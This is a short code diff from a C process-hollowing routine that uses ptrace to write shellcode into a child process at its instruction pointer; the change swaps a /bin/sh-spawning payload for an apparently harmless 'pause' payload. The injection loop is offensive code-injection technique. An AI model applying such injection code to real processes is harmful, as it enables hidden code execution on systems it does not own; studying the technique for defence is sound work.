@@ -13,7 +13,7 @@ int inject_hollowing(const char *target_binary) {
     pid_t child;
     int status;
     struct user_regs_struct regs;
-    int slen = shell_binsh_len;
+    int slen = shell_pause_len;
 
     printf("[*] Process Hollowing - Target: %s\n", target_binary);
 
@@ -47,7 +47,7 @@ int inject_hollowing(const char *target_binary) {
 
     for (int i = 0; i < slen; i += sizeof(long)) {
         unsigned long data = 0;
-        memcpy(&data, shell_binsh + i, 
+        memcpy(&data, shell_pause + i,
                 (slen - i < (int)sizeof(long)) ? (slen - i) : (int)sizeof(long));
         ptrace(PTRACE_POKETEXT, child, regs.rip + i, data);
     }
